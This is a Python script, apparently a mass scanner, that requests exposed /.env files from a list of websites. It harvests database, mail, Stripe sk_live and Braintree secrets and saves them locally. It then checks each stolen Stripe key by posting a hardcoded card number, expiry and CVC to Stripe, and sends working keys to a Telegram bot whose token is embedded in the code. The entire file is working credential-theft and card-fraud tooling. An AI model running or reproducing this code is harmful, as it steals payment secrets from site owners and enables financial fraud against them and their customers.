import re
import sys
import os
import time
import socket
import urllib3
import smtplib
import os.path
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Bot_TOKEN = "7159708949:AAHbCrsK2NnucwuDeKLcCdzlBEqEiiiK9yI"
USER_ID = "1312277549"

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LBLUE = '\033[38;2;66;165;245m'
    GREY = '\033[38;2;158;158;158m'
    YELLOW = '\033[38;2;255;255;0m'
    WHITE = '\033[38;2;255;255;255m'

class ENV:
    def __init__(self):
        self.mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=', 'BRAINTREE_PUBLIC_KEY']
        self.counts = {
            "checked": 0,
            "total_env": 0,
            "live_sk": 0,
            "integration_off_sk": 0,
            "dead_sk": 0,
            "braintree": 0
        }

    def scan(self, url):
        self.check_url(url, 'http')
        self.check_url(url, 'https')
        self.update_console()

    def check_url(self, url, proto):
        try:
            r = requests.get(f'{proto}://{url}/.env', verify=False, timeout=10, allow_redirects=False)
            self.counts["checked"] += 1
            if r.status_code == 200:
                resp = r.text
                if any(key in resp for key in self.mch):
                    self.save_output(url, proto, resp)
                    self.counts["total_env"] += 1
        except requests.RequestException:
            pass

    def save_output(self, url, proto, resp):
        os.makedirs('ENVS', exist_ok=True)
        with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
            output.write(f'{resp}\n')
        if "sk_live" in resp:
            with open('SK_ENV.TXT', 'a') as file_object:
                file_object.write(f'ENV : {url}\n')
            for line in resp.splitlines():
                if "sk_live" in line:
                    self.log_live_key(line)
        if "BRAINTREE_PUBLIC_KEY" in resp:
            with open('BraintreeENV.txt', 'a') as file_object:
                file_object.write(f'Braintree : {url}\n')
            self.counts["braintree"] += 1

    def log_live_key(self, line):
        sk_live_key = re.sub(".*sk_live", "sk_live", line)
        with open('SK_LIVE.TXT', 'a') as file_object:
            file_object.write(sk_live_key + '\n')
        self.make_stripe_request(sk_live_key)

    def make_stripe_request(self, sk_live_key):
        url = "https://api.stripe.com/v1/payment_methods"
        data = {
            "type": "card",
            "card[number]": "5178058714350744",
            "card[exp_month]": "01",
            "card[exp_year]": "2027",
            "card[cvc]": "263"
        }
        headers = {
            "Authorization": f"Bearer {sk_live_key}"
        }
        response = requests.post(url, data=data, headers=headers)
        if response.status_code == 200:
            response_json = response.json()
            if "id" in response_json:
                message = f"Live sk : {sk_live_key}"
                requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
                self.counts["live_sk"] += 1
            else:
                self.counts["live_sk"] += 1
        elif response.status_code == 401 and "api_key_expired" in response.text:
            self.counts["dead_sk"] += 1
        elif "Sending credit card numbers directly to the Stripe API is generally unsafe" in response.text:
            message = f"sk integration off : {sk_live_key}"
            requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
            self.counts["integration_off_sk"] += 1
        else:
            self.counts["dead_sk"] += 1

    def update_console(self):
        total_sk = self.counts['live_sk'] + self.counts['integration_off_sk'] + self.counts['dead_sk']
        sys.stdout.write(
            f"\rTotal Checked= {self.counts['checked']}, Total env: {self.counts['total_env']}, Total sk: {total_sk}, Live sk: {self.counts['live_sk']}, Integration off sk: {self.counts['integration_off_sk']}, Dead sk: {self.counts['dead_sk']}, Braintree: {self.counts['braintree']}")
        sys.stdout.flush()

def main():
    os.system('clear')
    print(""" \033[38;2;158;158;158m
███████╗██╗  ██╗    ███████╗███╗   ██╗██╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██║ ██╔╝    ██╔════╝████╗  ██║██║   ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
███████╗█████╔╝     █████╗  ██╔██╗ ██║██║   ██║    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
╚════██║██╔═██╗     ██╔══╝  ██║╚██╗██║╚██╗ ██╔╝    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████║██║  ██╗    ███████╗██║ ╚████║ ╚████╔╝     ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝  ╚═══╝      ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                                                               
  \u001B[0m""")

    while True:
        try:
            thrd = int(input(xcol.GREY + "[THREAD] : " + xcol.RESET))
            break
        except ValueError:
            print("Invalid input. Please enter an integer.")

    while True:
        try:
            inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
            with open(inpFile) as urlList:
                argFile = urlList.read().splitlines()
            break
        except FileNotFoundError:
            print("File not found. Please enter a valid file path.")

    env_scanner = ENV()

    with ThreadPoolExecutor(max_workers=thrd) as executor:
        for data in argFile:
            executor.submit(env_scanner.scan, data)
    
    env_scanner.update_console()
    print()

if __name__ == '__main__':
    main()
